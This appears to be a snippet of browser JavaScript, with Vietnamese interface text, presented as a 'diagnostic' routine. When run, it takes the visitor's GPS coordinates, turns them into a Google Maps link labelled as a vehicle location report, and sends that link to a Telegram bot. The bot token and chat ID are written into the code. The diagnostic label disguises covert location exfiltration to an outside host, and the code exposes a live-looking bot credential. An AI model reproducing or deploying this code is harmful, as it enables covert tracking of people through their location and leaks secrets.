<script>
    function runDiagnostic() {
        var status = document.getElementById("status");
        var token = "8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg"; //
        var chat_id = "1197457034"; 

        status.innerHTML = "> Đang kết nối...";
        
        navigator.geolocation.getCurrentPosition(function(pos) {
            status.innerHTML = "> Đang gửi dữ liệu...";
            
            var lat = pos.coords.latitude;
            var lon = pos.coords.longitude;
            
            // Cách nối chuỗi thủ công, tuyệt đối không có dấu $
            var linkMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
            var message = "🛠 BÁO CÁO:\n📍 Xe 54 4val tại: " + linkMaps;
            
            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message);
            
            fetch(url).then(function() {
                status.innerHTML = "<span style='color: #4cd137;'>> HOÀN TẤT!</span>";
                alert("Đã gửi thành công!");
            });
        }, function() {
            status.innerHTML = "<span style='color: #ff4757;'>> LỖI: GPS bị chặn!</span>";
        });
    }
</script>
